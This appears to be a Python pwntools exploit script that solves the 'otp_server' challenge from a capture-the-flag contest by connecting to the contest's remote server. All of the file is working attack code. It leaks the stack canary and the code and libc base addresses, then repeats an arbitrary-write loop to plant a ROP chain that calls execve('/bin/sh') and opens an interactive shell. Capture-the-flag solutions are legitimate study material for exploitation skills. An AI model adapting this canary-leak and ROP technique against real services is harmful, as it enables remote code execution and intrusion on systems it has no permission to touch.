from pwn import *

#p=process('./otp_server')
p=remote('challenges3.fbctf.com',1338)

slog = lambda x,y : success(x+': '+hex(y))
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
rl = lambda : p.recvline()
ru = lambda x : p.recvuntil(x)
rn = lambda x : p.recvn(x)
go = lambda : p.interactive()

cnt=0

def set_key(key):
    sa('>>>','1')
    sa('key',key)

def msg(msg):
    sa('>>>','2')
    sa('encrypt',msg)

def arb_write(off,val):
    global cnt
    print cnt 
    cnt += 1

    idx = 0
    while 1:
        set_key('A'*(off-0x100-idx)+'\x00')
        msg('A'*0x100)
        ru('MESSAGE -----\n')
        if ord(rn(off+8-idx)[-1]) == (val >> 8*(7-idx))&0xff:
            idx+=1
        if idx==8:
            break
'''
    idx = 0
    while 1:
        set_key('A'*(off-0x100-4-idx)+'\x00')
        msg('A'*0x100)
        ru('MESSAGE -----\n')
        if ord(rn(off+4-idx)[-1]) == (val >> 8*(3-idx))&0xff:
            idx+=1
        if idx==4:
            break
            '''

    

#[1]LEAK
set_key("A"*0x108)
msg('A'*0x100)
ru('MESSAGE -----\n')
p.recvn(0x108)
cnry = u64(p.recvn(8))
cb = u64(p.recvn(8)) - 0xdd0
lb = u64(p.recvn(8)) - 0x21b97
og = lb+0x10a38c
syscall = lb+0x13c0
binsh = lb+0x1b3e9a
poprdi = cb+0xe33
poprsi = lb+0x23e6a
poprax = lb+0x439c7

slog('canary',cnry)
slog('libc_base',lb)
slog('code_base',cb)

#[2]EXPLOIT
arb_write(0x148,syscall)
arb_write(0x140,0)
arb_write(0x138,poprsi)
arb_write(0x130,binsh)
arb_write(0x128,poprdi)
arb_write(0x120,59)
arb_write(0x118,poprax)

go()
